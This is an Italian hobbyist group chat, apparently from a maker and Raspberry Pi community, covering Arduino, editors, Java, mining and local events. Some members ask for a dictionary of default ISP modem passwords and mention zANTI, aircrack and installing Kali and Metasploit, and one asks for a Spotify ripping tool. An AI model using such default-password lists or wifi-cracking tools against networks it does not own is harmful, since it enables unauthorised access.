Ragazzi mancano solo due giorni all Arduino day... A Milano si moltiplicano le manifestazioni voi come festeggerete ?
Dopo che Instagram ha inserito lo stesso concetto nella sua app, tutti a ripudiare Snapchat
Alcuni erano convinti che Snapchat avesse copiato da Instagram
Si, so com'è la storia
Brutta storia
Tutto nella norma
Raga devo comprare un buono amazon
Pagabile con paypal
 sto lavorando mattina e pomeriggio..domenica sera mi dedicherò a farne almeno un'altro, se riesco entrambi
Comunque HO SCOPERTO L'ARCANO DI GOOGLE DRIVE FILE STREAM...

In pratica se uno ha l'account illimitato Windows mostra 1EB e fin qui tutto nella norma.
Lo spazio che mostra dice tot GB disponibili su 1EB
I GB se osservate solo leggermente meno dello spazio disponibile nel disco "C:\". Questo perché quando copiate dei file vengono messi "in attesa" sul disco c ed iniziano contemporaneamente ad essere caricati sul drive. Una volta online (se è stato scelto la modalità solo online) viene eliminato da "C:\" e lo spazio disponibile torna alla dimensione di prima il tutto cambia continuamente rimanendo sempre leggermente meno grande del disco C.
Ci sono rimasto di merda
Cosa ci fai su MC ita
da un po' sono tornato sul forum
mi sono preso una lunga pausa... Non mi si vede dal 2014/2015
Lol
Posso dirti che era meglio nel 2014
lo so meglio di te.
Quando mi iscrissi
nel 2015 ero sparito completamente dopo aver litigato con *tanta* gente
ora sono tornato e molta gente con cui avevo litigato mi sta simpatica
si google ha comprato il .google
Tanto i soldi li hanno
io nel 2013
Gg
basta fare richiesta e pagare e l'icann ti da il .<cosaVuoiTu> ahaha
altrimenti come me la spieghi questa
Omg
Devi anche provare di avere dei DNS apposta
Oddio anche io sono iscritto da un botto di tempo... iscritto una volta, forse mai pubblicato nulla neanche risposto...
ma poi sono stuck sulla targhetta "griefer" (che si ottiene quando hai scritto tra i 750 e i 1000 messaggi) da almeno 3 anni
 sono pronto per l'invasione
Non ne parliamo
Al bar di piazza mostra stasera è successo il delirio
C'erano tantissimi alpini. Sbronzi. Tanto. Che cantavano canzoni da alpini. Ma erano così sbronzi che hanno preso a cantare Bandera Rossa, l'Internazionale e cose così
Non vedo l'ora di rivedere la genta distesa sugli scalini e il vomito che scende lungo le strade
❤️

e poi scopro che Gigi D'Agostino era a Vicenza due giorni fa ._. 
Se non trovi nulla e sei pratico puoi sempre costruirlo un ponte H... è una cretinata...
Ma poorc
Hardware Upgrade: La fine di un'era: il Blocco Note di Windows supporterà i file di testo di Linux e macOS.



tramite Google News
Ma stiamo scherzando?????? 
Finalmente.... Tanto ormai ho impostato notepad++ per i file di testo 
Era ora, tanto uso notepad++ che lo supporta da anni
il mio è un sonoff touch
Beato te  Stefano a me deve arriva ftdi
ma sono l'unico che col notepad immaginava dove sarebbero potuti essere gli \n?
su linux \n, su macos \r, su windows \r\n
lo so
ma modifico spesso file di linux col notepad di Windows
cerco di immaginare dove stanno gli \n
un anno fa sono stato tipo fermo una settimana per capire perché un parser di file di testo che avevo programmato andasse solo su Linux... Poi ho scoperto che cercava solo gli \n e non gli \r, quindi se c'era un \r\n, \r lo lasciava nella stringa e causava problemi
Voglio quel vid ahhahaha
Learn c++ in one Video



by 
devi pensare che in realtà \n viene convertito come 
 e \r come 
 nel codice ascii, e sono caratteri visibili solo come (appunto) un "a capo"
poi volendo li puoi vedere proprio
primo file che avvo sottomano 
ma io non ho il Notepad++
se proprio mi serve lo apro con Visual Studio
non mi va di installare roba
io lo uso come editor principale perché lo trovo comodo, è leggero, riconosce quasi tutti i linguaggi e non ha tutto lo schifo che la maggiorparte delle volte è inutile e rompe solo
e poi lo ho impostato di default per usare \n e utf8, cosa che altri editor non fanno
file creati con qualsiasi altro editor su windows
In teoria ci sono comunque dei pin a cui saldare un pulsante aggiuntivo, ma non so quali siano..
Programmi in java per gestire disositivi wifi?
Scusi
Me lo consigliate se qualcuno ce l'ha?
Per 40€ credo ne valga la pena
Cerca recensioni
AHAHAHAAHAHAHAHAHAHA Che molesta, vero 
?
ahahhahaha
Il micro è molto buono, lo usano in tanti sulle mirrorless
AAAAAAWW 
'giornooo
e tra 8 minuti si ritorna in classe 
La fine di un'era
E in tutto questo Amazon non ha ancora ricevuto il mio Pro quindi sono senza microfono perché non mi rimborsano 

Rippissimo
Ahahaha alla buon'ora 
Ma si era rotto o solamente piegato?
Solo piegato ma ne approfitto per azzittire la mia scimmia di Pro Plus
È stata una caduta tattica
Hai provato a parlare in chat?

Si, ma è SDA che si è perso
Sticazzi, fattelo rimborsare da SDA
Strano
"Stiamo arrivando, non preoccuparti"
No beh lunedì mi metto ad insultarli in chat finché non mi danno i soldi di quattro microfoni più i danni morali e un viaggio alle bahamas di un mese
Se hai tutte le ricevute apri un ticket o chiami l'assistenza e ti fai mandare il rimborso
Basta che mi porti alla Bahamas visto che non vuoi venire manco in puglia
Microfoni RED X Röde professionali pagati a peso d'oro si intende
Vi ospito io
Fai 2 viaggi! Io vengo con te!
No dai l'LTE down no
Non so se sia per il fatto che in città ci sono 650.000 alpini (5 volte la popolazione di tutto il grande comune di Trento), ma l'LTE è down e la fibra mi crasha a singhiozzo... Non garantisco la puntualità del video di domani 
quindi la soluzione o è togliere il relay esterno al sonoff oppure non posso usare il sonoff.
però con il firmware tasmota potevano mettere la funzione che invece di attivare il relay interno mandavano un impulso perchè con un esp dovrebbe essere una cazzata
 ma tu che telefono hai?
One plus one
thx
ed è buono?
Quite old, è del 2014
Non saprei... Secondo me rimane più semplice e veloce saldare il  relay che hai già al posto di quello del sonoff
Non so se sia per il fatto che in città ci sono 650.000 alpini (5 volte la popolazione di tutto il grande comune di Trento), ma l'LTE è down e la fibra mi crasha a singhiozzo... Non garantisco la puntualità del video di domani 
Ti conviene andare in bici a Bolzano e caricarlo da lì. Ci metti di meno
ho indagato e nel muro c'è un relay ciclico funziona lo stesso se lo collego al sonoff?
Ragazzi ho un problema con Steam. Da diversi giorni non scarica più gli aggiornamenti, scarica i pirmi 5 mega e poi si ferma. La connessine non mi da problemi in altre app
Booh
50 euro
Eh?
eh l'hai nominato
Che c'entrano i  50 euro?
si vede che non segui le live di Marco 
Non segue mais, lui ☹️
sono l'unico mod attivo, insomma 
Hey
Diciamo che è una storia abbastanza vecchia quella dello sponsor a oneplus
Le fai sempre quando sono all'università ☹
(ossia sempre, ma vabbè )

È deprimente quando ti accorgi che è la prima volta che mangi a casa durante la settimana da... Boh
Che app è poi che ti crea sto grafico


Nexus 4... Del 2012.
Only love reactions 
Non ti so dire per questo...
i commenti quelli belli

per fortuna sarà closed source
Che poi, ad essere precisi, gli alpini sono circa 90.000. I 600.000 sono il numero di "turisti" che passeranno a trento nel finesettimana, con un picco previsto per domenica di 400.000 persone
C'era la Cristoforetti oggi in Bicocca
astrosamantha?
Potevi venire
Yas
Sentita troppe volte quella donna
È per switchando cloud?
yes
precisamente è il metodo che deciderà se accettare o no le connessioni dai vostri Raspberry
Prima o poi mi domoticizzo la camera
Proiezione planometrica... Come elevo il disegno?
Le misure su foglio sono raddoppiate
Grazie risolto
Ciao ragazzi.. posso allegarvi un articolo riguardante l’industia 4.0 scritto da me?
E se la risposta è si sarete così gentili da leggerlo e dirmi le vostre opinioni a riguardo?
Sareste*
Sì dai mandalo a me... ti dico che ne penso
In chat privata?
Interessa anche a me... Se vuoi mandalo anche qui
 
Switchando non era open source?
beh
Lo è ancora
Ma Switchando Cloud != Switchando
Non credo sia molto sicuro esporre il lato server
Vorrei conoscere l'amministratore...
Roberto che fai nella vita?
 piove?
si, ci sta
Maybe
Ci si becca in giro?
Ciao Roberto
Piacere Francesco
Sei uno degli amministratori... di che ti occupi... sei studente o altro?
fighissimo, bei tempi!!!
Studente studente
Di che?
Di che?
Fisica
Sono qui per sport 
Ah ecco...
Perché? Ho l'aria da fisico?
Sono in un paesino non so dove al momento
Ah 
Beh se capita...
Non saprei dirti
mi stavo leggendo le chat vecchie, e ci ho messo tipo 10 minuti a capire chi era Casper 
Hai l'aria da muone
Miii un pelo sottopeso sarei
No... era così per sapere
Più da bosone W
Hai l'aria da un qualsiasi essere umano, principalmente azoto, poi ossigeno e anidride carbonica
Allora un atomo di plutonio-239
Chimica -.-
uranio 235
boooom
a caso .-.
Ma non c'è notepad per linux?
leafpad
Gedit
Sorry notepad++
sublime text(?)
Eh gedit è nodepad++ tipo
Senza troppe pretese
Ma che tristezza
^
Non so cosa sia
non so se c'è per linux
yep
c'è
Eh sublime è un livello più alto di notepad
meglio no?
comunque manco troppo
sono quasi equivalenti
Wine
È la risposta a tutto
Ma no
Dai insomma
Crasha
Ban
deep learning
Ahahahahaahahahaahahahaahahahahahahahaahahahahahaha
chi di voi si intende di wordpress?
mi servirebbe un plugin che visualizza in real time dei dati prelevati da mysql
chi mi puo aiutare con un programma in c++ del quale non ho capito nulla?
Vai provo
Ma non prometto nulla
il programma è questo
Ah oddio quelli delle olimpiadi, faccio schifo
(a parte che non carica il sito)
Che problemi sessisti -.-
si lo so ma il professore mi ha detto di provare almeno a farlo
Minghia
???
il problema è che non ci ho capito nulla
In pratica, prendi il primo esempio

Le coppie sono (1,3), (3,1), (2,2)
Se M1 e M3 partono insieme si scontrano
cioè
perche le coppie sono quelle
Si scontrano i due maschietti
ok ho capito
Quindi la maestra non può chiamare tutti i maschietti ma solo alcuni, facendo in modo che le loro traiettorie non si scontrino
okay
E quindi devi capire quanti maschietti può chiamare e moltiplicare per 2
perche per 2?
Perché la risposta è il numero di bambin@ che hanno baciato qualcun@ che gli/le piace
Quindi sia il maschietto che la femminuccia
ok ho capito
grazie tantissimo
Morto
ma che cazzo sto leggendo
Questi sono i dubbi esistenziali
.
.sh
ma che cazz 
Raga ho un problema
Ho winzoz in dual boot con ubuntu, quando uso Ubuntu però l'orologio di Windows rimane indietro di due ore
Come faccio a fixare?
Hai scoperto la macchina del tempo, amico
anche a me capita 🧐
Mmmm in teoria non è buona cosa
basta che togli e riattivi la sincronizzazione dell'orologio
O utilizzando due server diversi si sincronizzano a due ore diverse
Prova a vedere così se risolvi 

ma non rimane salvata nel pc l'ora, li pare servisse a quello la batteria sulla motherboard
La batteria tampone
Ho bisogno di voi hacker
Chiedi a romboli allora
avete presente le password di default dei modem (es. Tim, Alice eccetera)?
yep
secondo voi esiste un dizionario con le password di default? 🤔
mi pare di si
su Google non pare ci sia
che sul mio telefono non funziona 
Default Router Passwords - The internets most comprehensive router password database

prova qua
ottimo, c'è tutto tranne Telecom, Alice o Tim 
e comunque sono le password del pannello admin, non del wifi 
Sei riuscito a far funzionare per bene zanti?
nel vecchio tel. si qua non lho ancora scaricato non avendo il root
Usa un searcher prog,che cercherà dappertutto
Maaaaaaaan
This is spamming
anche a me e a 
wtf?
Posso creare ed usare come un cloud un server FTP?
Si, ma non farlo
È lento e non criptato
Ma lo posso tenere offline e metterlo online quando mi serve?
gg,ez
Potete farmi un favore? Entrate nel link e votate dawn follower...

Buon Arduino day a tutti amici!!! 
Vecchio ma vogliamo le foto almeno
Cosa hai fatto di bello?
Un pannello solare che segue il sole per produrre sempre corrente
Che cosa e'?
Un pannello solare che segue il sole
Ti dispiacerebbe votare il progetto per farci vincere il progetto?
Sta qua il link
L'ho votato... mi mandate il programma...??
Chiedo al dev
Dovrebbe essere online anche il sito,ora chiedo
Il Dev ha detto che puoi contattarlo nel pomeriggio,si chiama 
Ok grazie tanto...
Bella l'idea del posizionamento dei fotoresistori così🤔
L'avete basato su un algoritmo di PID o è solo proporzionale?
Ora chiedo al dev
Ti dispiace votarlo?
Già fatto prima ancora di scrivere tutti i messaggi
❤
Quando collego un carico all'alimentatore, la tensione scende da 12v a 3v... Può essere che è un problema del condensatore?
 
 
Ciao a tutti
Solo proporzionale se è quello che credo
Grazie
Questo tizio sta male
Scusate pensavo si potesse inoltrare da ignuranza
Buongiorno, un’amica avrebbe un problemino. Stava lavorando su un file di OpenOffice e ad un certo punto tutte le 28 pagine son diventate piene di cancelletti. Sapete cosa e successo ma soprattutto se è possibile (e come..) tornare alla normalità?
Grazie in anticipo
Ci siete
Dipende cosa hai collegato
E sempre così? ?? Non credo!!!
Però con fotoresistenze
Le avete coperte lateralmente con guaina termorestringente?
Nel progetto che è  arrivato 2'
Una ventola, ma il problema è che l'alimentatore ha due canali... (Fatto da me ovviamente) ma con uno funge e l'altro no
Stesso regolatore, lm317
Ma su questo che non va non ho messo il condensatore pensando che non serve
E perche'?
Vanno sempre per livellare
Allora è quello, ora lo metto
Ti scende a 3v ....
Mettilo  e prova
Ma è un kit?
No
Prima il regolatore era su una pcb con tutto il resto, ma l'ho tolto e saldato a parte perché il circuito che ho fatto è diverso
bella gente, tornato dalla calabria, ho riattraversato il po', son tornato nella 
 unione europea, ritornato in italia, sono moro, devo studiare filosofia, qua piove, io mi sparo
cmq bella l'africa
Un interruttore cambia tra due potenziometri, che dettano a 12 e 9v
Ma la Calabria sta in italia  ahhh questi nordisti
Dovrei vedere lo schema
Comunque c'è lo stabilizzatore...
Si, appena arrivo mando
E questo carico quanto assorbe?
0.5 A
si beh, sotto al po' io non li considererei italiani, dovevi vedere l'ignoranza, andavamo per le strade a mostrare gli accendini alla gente e a dirgli "questa è la magia del fuoco, cavernicolo"
Ma
Ci sono sempre le eccezioni
è stato bello
Anche al Nord si trovano 
In Basilicata siamo normali
Così offendi 

alquanto, beh si fa per scherzare però dovevi vedere la gente nelle scuole che roba
Vi state divertendo!!!!
*stavamo
ora sono a casa, al nord, in patria, con la febbre
Le persone del sud non ti vanno BENE?
Ma eri in gita?
già
Qua qualcuno programma in java?
comunque io sarei anche andato al sottozero...solo che quando ci stavo passando davanti stavo al contempo perdendo il treno tipo
però hey, al matteotti c'è robba buona
no comunque bellina la calabria, soprattutto il mar ionio
Figo
Io
Che fai?
O per lo meno che applicazioni hai creati?
Peccato che è pieno di bug e de li risolvo si impalla a causa dei cicli
Creato?
Che Ide utilizzi... io Eclipse 2.1
No
Sarebbe andato meglio...
Coprire solo i bordi
Dici... Ummm... Dovrei provare
Fai la prova mettendo la guaina in modo da coprire tutti i lati... rimane aperta solo la parte anteriore... misura la resistenza e vedi...
E come lo intubassi
La intubassi...
La luce e costretta ad entrare solo frontalmente e non lateralmente...
Usa la nera...
Devo provare il sensore Hc-sr04
Sara' la parte più difficile...
Usa Java
Dimmi che non sei serio/a...
Non so programmare in java, lo studiamo l'anno prossimo a scuola
Ottimo modo per arrivare gia preparati
Poi c'e' scene builder
Magari quest'estate me lo studio
Sei della Basilicata anche tu?
Non è male come ide eclipse
Diciamo... ma stai usando una versione del 2000
La oxygen
Tu hai detto 2.1
Io?
Magari se ha linux gli installa quel pacchetto
L'altro tizio
Io
Sì una versione del 2003/2004
Non e' recentissima
perché giustamente io mi dovrei ricordare questo IP locale a memoria
Ecco... una domanda: perche'?
Usa la oxygen
Come e' potuta succedere questa cosa?
Perché ho sempre utilizzato quella...mi piace
Non mi sembra tanto produttivo rimanere nel 2002, poi fai quello che vuoi
Ho preparato l'esame di programmazione con quella
Si
Non l'ho più cambiata
Potenza o Matera?
La jdk era la 2. Qualcosa
sono sempre più tentato dal comprare un MacBook (solo per il design, sia chiaro)
ma poi c'è una cosa che mi fa cambiare idea
Potenza
Che fate in java... swing
Matera merda
Ora quale usi?
???
Le ultime naturalmente...
JavaFX... swing e' deprecato
Quelle non le ho piu
Meno male
Io utilizzavo le swing
Che fa javafx...non le conosco...
Fa GUI decenti
Da che versione sta in giri?
Giro?
Boh, io uso JDK 10 e c'e'
Classi per gestire la wi fi
chi di voi ha spotify premium con il programmino che scarica la musica?
Haha
eh?
mi servirebbe una canzone in flac
nel futuro (molto lontano) saranno tutti così, niente più IP a 4 numeri 
Per rs232 c'era e anche per usb
In Italia questo futuro e' ancora piu lontano
Qualcuno ha lavorato con  il wi fi?
invece molti operatori in italia già supportano gli IPv6
Fastweb è un esempio
Supportano si, c'era da tagliarsi le vene senno'
Ma nessuno lo usa
Che vergogna
IPv6 connesso
notare che l'IP è locale, ho un router connesso ad un altro router 
Pure io lo uso per i miei raspberry
Anch’io 
Anche io
Ne ho uno in casa e uno in camera
Io ho 8 switch connessi al router connesso al modem 
raga, il commodore 64 
Comunque la versione jdk doveva essere la 2.5
Era fantastica... javafx non esistono libri in italiano
Qualcuno fa mining di bitcoin o altro?
Non servono neanche libri per quanto e' semplice
Io, ma non BTC
Con quante schede video?
Non molte, una 30ina
E che hai la centrale idroelettrica a casa!!!
Pannelli solari
E quasi una centrale allora!!!!
Yauuu esci una foto...Delle schede
Non sono nulla di che, ho pagato 20k per tutto
Non puoi cambiare niente, neanche la RAM
lo so
la cosa che mi fa cambiare idea la puoi vedere nella foto che ho mandato
raga ma cosa può essere?
guardate la velocità appena parte il test dell'upload
è fisicamente impossibile che vada a 650 mega, il mio router è collegato al modem che è collegato alla VDSL con un cavo da 100 mega, è fisicamente impossibile che vada su internet a più di 100
lol 80 mega nel 2018?
eheh dillo al mio modem del dopoguerra
e a Fastweb che mi blocca a usare quello loro
Comunque prova con qualcos'altro
?
Alternative di speedtest
ah, fanno tutte cagare
nessuna che ho trovato ha i server in Italia
 ieri avevo letto il tuo nome e volevo chiederti se fossi di atella... Ma poi mi sono detto "il cognome non c'entra nulla" 
Non hai una VPS in italia? Installa il servizio
yeee
il mio server DNS personale inizia a dare segni di vita
anche no, ho un VPS in Francia che già ha una connessione abbastanza lenta
Dimmi
Dimmi
Non gli hai fatto una domanda?
A chi?
Ahahahahaha
Qualcuno di voi ha dreamspark?
Qualcuno mi invia la foto del suo google home?
oddioh
cos è?
lol
raspberry pi finto?
Bah è un Odroid C1
Costa più di quello che vale
ragazzi help please.
ho usato il codice del libro e ho un variabile globale int count = 0;
ma in tutti i code block dice "count is ambigious"; cosa faccio?
C++
P.S. nel c++11 va ma nel c++98 no. Voglio capire qual'e il problema .-.
usare un ipv4? 
naaaahhh
io lo devo per forza comprare per scuola e developing tra un po', il problema è...

NON HA UN CAZZO DI JACK 3.5 mm
quello del 2016 aveva il jack? 🤔
Dai su fra non dire cretinate.... non puoi avere 20k da buttate a 16 anni
Chi è il mona che ti fa utilizzare MacOS per programmare?
Sempre
nessuno, ma serve a me
ovviamente non prendo il modello 2018 che costa quattordici reni
ah, lo prendo anche per Logic Pro ovviamente
Bombulon cu la nutella
È???  Nutella?
mi hai ricordato che devo aggiungerlo alla wishlist
però ora sto risparmiando soldi per il Mi 7, GHome viene dopo
Io
Ma che cazz
Ma sì dai manca un punto
Come installo metasploit sul rasp?
ma solo a me piace di più quello full-size?
Si ma costa troppo...
20€ in più mi pare .-.
20€ sono 10 gelati...o 2/3 di un raspberry
200 goleador

Vedila come vuoi...ho preferito quello piccolo perché volevo provarlo....
Per audio non serve perché si può Callegare alle casse Bluetooth
2 orange pi
E ti danno pure il resto
0.0001 odroid 
Non l’ho mai visto
Sarebbe fighissimo stamparselo con la stampante e farlo con il rpi
è quello che sta facendo Marco hahahahahaah
Lo so
Ci saranno sicuramente i modelli... va visto se riesci a contenere tutto
Perché no? Volendo si fa un po' più grande
 giusto....la versione megasarebbe bello
Grande quanto un cestino
Lol
Secondo voi meglio che rimango a win 7 o passo a win 8/8.1? Il 10 no
Meglio win 10
uhm ora avrebbe 18 anni se non sbaglio,ma nella biografia dice che sa solo python java e c,but why? .-.
Win 8 ...so che è buono...ma non so se è vero
Cosa dici.... MsDos è la vita...
Vabbè...ma lui vuole usare il mouse...
only bios
itfw
A questo punto torna a colorare le pietre...
mi programmo da solo il bios e uso quello
usando solo una tastiera esadecimale
e 8 display a segmenti
No meglio un PC a 8 bit con relè...
*valvole termoioniche
Te lo consiglio vivamente per la rapidità di boot, l'ottima grafica e la numerosità di dispositivi supportati

L'ultima mi piace molto
I dispositivi?
ellamadonna
Cosa
è gente che lavora ad un account github
quasi 4000 persone O.O
Aver
E il remix di Windows xp
Avete
Visto
se non vuoi il 10 (fortemente consigliato) allora rimani al 7
perchè?
l'8 non è buono?
Win10 è il Win8 mancato
di bianco e di nero, così puoi fare le stringhe di bit
Quindi tanto vale avere una versione pesante che incompleta
E poi meglio Linux 
qualsiasi tu abbia visto non è ufficiale
però...
a me non serve tutta quella robaccia che sta sul 10
mi rompe solo le palle siccome ho un ssd 120gb
Se questo esistesse avrebbe rimpiazzato il mio Win10 da un bel pezzo 
appena installato, Win10 pesa 15.7 GB
vorrei installarlo ma dentro di me sento di no


Avranno rimexato Windows xp
come posso allegerire win 10 se lo installo?
la iso pesa 3 giga
normale?
Mano è più semplice di installare Windows
Io penso che winzoz sia inutile....
Prova Manjaro o una qualsiasi distro basata su arch
Winzoz è lezzo
Non posso installarla ho già provato, il mio PC non regge PE archittetture x86_64
ah
Molto più semplice
Perche ho la partizione uefi sul secondo hard disk
Si, l'hai già linkato Instagram.
sì
adesso? l'articolo mi sa che aspetta domani 
☺️
Che colpo al cuore
Ormai
Poi mica li ho buttati 
Vabbè io penso a chi gli ha lavorati...20.000€ sono tanti da fare...
Neanche tanto
Comunque sono soldi miei
E poi ti serve un inverter da 15 kW... dove lo hai preso
Mica 30 GPU in un unico PC
Appunto ogni PC consuma 0,7KW al 100% se sono 30 sono parecchi
Poi con 30 GPU...+ I pannelli solari+ inverter+ batterie....superi 50.000€
Parlano di mining?
*si inserisce nella conversazione*
Si ... risali..
AHAHAHAHHAAHH
Costa quasi quanto un mac
40 mele marce per l'esattezza
Come fai a sapere quante gpu ha ogni pc?
Embè? I pannelli solari già c’erano
mi appello a voi che siete molto piu competenti di me esiste un modo per sapere se una foto è stata caricata su facebook instagram etc...
Statistiche...3-5 schede
Beh non esiste un cercatore di immagini
L'ordine nel quale ha incominciato a diffondersi?
Non lo sa
Non sa neanche se è sul web


Tu hai 30gpu?
Io ho una 580 da 4gb
Come la mettiamo ora eh??
Comunque non ho speso tantissimo... 25K in totale circa
30 per il mining, poi ho una build personale anche se odio giocare ho il pc da gaming 
Wow
Fai una guida su Gentoo
Su Arduino come funziona il simbolo "!"? Non so come usarlo per fare una negazione
Cioè la sintassi
If(variabile !0) ?
!=
Nei valori booleani viene usato per invertirli
Nope, devi fare if(variabile!=0)
Oppure if(!(variabile==0))
if(!false)

Quindi 
 è equivalente a 

JS: 
JS è strano solo a pronunciarlo
e poi c'è il mio prof di informatica:
"... JavaScript, che si basa su Java..."
Comunque, chi sta vedendo l'Eurovision?
Vabbè ma se fosse più intelligente non farebbe il prof... No?
Grazie a tutti
Prego
Si come il C si basa sul Ca***


io sono a programmare, come ogni sabato sera
 hai pienamente ragione
chi sa fare fa, chi non sa fare insegna
Esatto
Ubuntu e' anche peggio.. u.u
Epic sax guy

Coff coff

 EPIC SAX GUY SOLO - Moldova -Eurovision Song Contest 2010 ...
Posso chiedere una cosa anche se e' OT??
vai vai
Conoscete qualche illustratore per caso??
Su Arch prima... Però servono almeno un 3-4 ore di video
Ottimo :)
Arch alla fine in 15 minuti hai fatto 
con Cicca 
Quello c'è stato l'anno scorso, ed era bellissimo
Eh, ma devo anche spiegare nel video, non posso mettermi a battere sulla tastiera come una scimmia
Perché?
Comunque ho appena messo lo sfondo animato dei pixel e OMG che figata  che cambia il parallasse in base a come muovi il telefono
Cosa devo fare?
Disattivare l'antivirus, a occhio
Qualcuno sta bloccando w32di dallo scrivere sulla chiavetta
Non è l'app Sfondi di google sul PlayStore, vero?
Ora provo
Imho ubuntu non e poi cosi diverso da winzozz.. entrambi sono dei punta e clicca.. 
ma è normale che quando metto la sd mi compare anche un'altra unità?
Mica è un gioco...
Ho sbagliato scusa
?
Mica è un gioco
Scusa ho sbagliato messaggio a cui rispondere
e la batteria gode
?
aveva sbagliato messaggio
non voleva rispondere a te
ehm... cos?
Sono 90 euro...
Hai mai visto un pixel 2? Che hanno questo sfondo nel quale cambia l'inquadratura della scena a seconda della schermata e a seconda di come fisicamente muovi il telefono? Figata
no vabbe
ed io che sono bloccto ad android 5 col mio samsung di merda
SAD 
Anche senza l'antivirus da errore
AH, sono fermo al 6.0.1 io 
ed io a 5 0 1
brutta cosa
piglio sempre i telefoni sfigati
quello scorso a 4.4.4 era bloccato
questo a 5.0.1
Io ho ancora iOS 9 ahaha
Non intendo aggiornare
iphone meddddddaaaaa
ma boh io di iphone non ne capisco un cazzo e mezzo
ma nulla proprio
Dopo aver cambiato 5 Android nel giro di un mese mi sono preso un iPhone
Sinceramente su un telefono non ci faccio chissà cosa
io vivo con lo stesso android da 1 anno .-.
vabbe che per chi non fa cose particolari iphone va benissimo
(quasi 2)
Buono
Il mio durò 2 anni e mezzo
Cosa ci vuoi fare con un telefono? 
poi si è rotto lo schermo e rip ma lui va ancora
tra i cristalli sconquassati si vede qualche icona della homescreen
Chiami, messaggi e lo tiri in testa alla gente. Stop
Beh per tirarlo in testa alla gente l'iphone è avvantaggiato
ha la scocca in metallo
ma anche il mio fa male
Eh io ci avevo messo sopra nethunter con aircrack
Avete visto il video di LinusTechTips sulla batteria degli smartphone? (in pratica dimostra perché per far deteriorare meno possibile la batteria nel tempo bisognerebbe non caricare mai il telefono sopra il 65%).
Che ne pensate?
Secondo me ha anche ragione, ma è un po' come essere vegani: vivi tutta la vita mangiando come un malato per morire sano, fosse anche 3-4 anni più tardi.
Cioè boh, non vedo il senso di usare metà batteria del mio smartphone affinché, quando anni dopo giunge il momento di cambiarlo, la batteria sia ancora in ottime condizioni 
e cambiare una batteria costa 20 euro
non se è una batteria non rimovibile ._.

Non ha senso... Caricheresti comunque molte più volte la batteria...
Compri su AliExpress, apri, dissaldi/unplugghi, cambi, enjoy non avere più la garanzia 
sisi e poi succede che ti esplode il telefono come a Bentivegna

Qualcuno mi aiuta ad installare debian sul rasp?
É dalle nove che provo a scaricarlo
Che ha fatto quell'altro? 
Romboli
Aiutami ti prego
Ho scritto un immagine su una sd da 32gb ma ora che la ho formattata mi compaiono due dispositivi (non uno) che hanno uno 127 mb e l'altro 6,69gb. Come devo fare?
devi tenerle così
una e di boot
mettila sul raspi così
è rosso
non fa niente
Come la faccio a far tornare normale
l'hai attaccato all'HDMI?
Si
e non fa nulla?
No
Fa solo rosso
riprova a flashare la sd
Come la faccio tornare normale?
devi metterci una distro per raspberry, ovviamente
elimina tutte le partizioni della sd e creane una nuova
non lo so fare
cerca su google, non sto qui a spiegarti 
Sei su winzoz?
si
Scarica win32disk imager
era un modello speciale con montato sopea al posto dell'A10 un FX
Lo ho
Ma devi elimane le partizioni?
Voglio riportare la scheda ai dati di fabbrica
Ok
Allora cerca tra i programmi "crea e formatta partizioni"
mi da del disco rigido
Basta che ti ricordi la capacità della chiavetta o le partizioni e la trovi
Penso che sia la seconda "disco 1"
Ok ho eliminato
ora è così
Ora fai tasto destro e clicca nuovo volume semplice
Hai finito
Provo a scriverci l'immagine?
si, ma se usi win 32 disk imager,
Ti crea le stesse partizioni che hai eliminato prima, e quando ha finito windows ti chiederà di formattarle, ma non farlp
Ok
Con questo programma per le partizioni
Posso fare anche altro oltre a togliere le partizioni dalla mia sd?
Formattare le partizioni, crearle, allocarle, è una sorta di gparted
cos'è gparted?
Un tool per creare partizioni su linux
Mi ha dato un errore strano mentre scrivevo l'immagine
mi ha detto che non riusciva a leggere qualcosa
o una cosa del genere
Su win32disk imager quando hai settato le cose devi cliccare su leggi non si scrivi
io ho l'immagine
per metterla sulla sd faccio scrivi no?
Apsè ho scritto male
Devi cliccare su scrivi non su leggi
Si
Sta facendo
In caso di bisogno ti scrivo
Ok
Io sono qui
Grazie
Di niente
Che sistema operativo stai mettendo?
kali
Su quale rasp
?
Pi 3
OK io provai sul pi3 b+ ma non va
Sto seguendo questa guida 
C'era la guida dal sito di kali
per il rasp?
Si
Va beh l'importante è che funziona
Però e per linux
Ha finito
Da rosso
non fa niente
Non da nessun output
Hai scaricato quella giusta
??
Provo a scaricare l'altra versione?
Non lo so
Devi prima riformattare la sd
Ora formatto
Provo l'altra?
Vai
Ok sono stupido
Non ho messo quello del rasp 
?
Io avevo la prima opzione
non mi ero accorto che c'erano altre opzioni
tipo RaspberryPi foundation
Io pensavo avessi messo quella
Io pensavo che quella non esistesse
Perché non metti rapbian?
Raspbian
idk
?
non lo so
La ho provata ma mi hanno consigliato questo
Kali re lo consiglierei anche io, ma raspbian è la distro più stabile che esista
In più devo imparare ad usare metasploit e questo lo ha già installato
Metasploit lo puoi installare e usare dappertutto
Si ma quello lo ha già installato
Ora però mi viene un dubbio
Perchè sono stato due ore a cercare di installare kali quando postevo installare metasploit subito?
Non saprei, forse la tua curiosità
Ma cosa vuoi dire con stabile?
Che va bene su tutti i raspbery
Ma non dovrei avere problemi lo stesso no?
No
Perché sei poco furbo
Domani lo vedo e pubblico, thx
Di niente
Bhe insomma
Lel
E poi la gente non capisce un azz xD
Qualcuno a Trento per l'adunata alpina?
ma che cazz
spero sia a casa tua 
Certo
Perché?
 
 verso le 18 voglio vedervi assieme a Mattarella a guardare la sfilata degli alpini di pordenone e della loro banda (occhio al cassista)
Mi sa che si è incazzato quello al piano di sopra

pensavo l'avessero mesaa agli alpini
Non ho capito
Ahahaahahaha io penso che sarò a casa a dormire 
Eh 
Yess
Ma Mattarella?
Ah beh poco male 
Me too sezione veneto
Io 'sezione casa mia' "vediamo l'invasione alpina" 
Ma quando escono i nuovi video di web development?

Io suono 
Mattarella l'hanno fatto atterrare a Mattarello 
Sono passate le frecce tricolore?
Yes
Viste in lontananza
Viste benissimo da casa
Peccato che non avevo l'sd nella Canon 
Noi siamo partiti alle 9 da Vicenza che suoniamo alle 17/19 
Sono passate proprio davanti casa 
Bello in colonna 
Raga il mio telefono continua a connettersi e disconnettersi alla rete ogni 30 secondi... qualcuno sa come sistemare?
Pordenone
Suoni o alpino?
Suono

Rivatti a Martignano
Sei a Martignano? Sopra casa mia in pratica 
Io adesso esco, voglio salutarvi tutti 
Stiamo guardando per trovare una strada aperta per gardolo
Il giro dell'oco stiamo facendo
Eh forse la tangenziale mi sa
Non mi ricordo se l'hanno chiusa
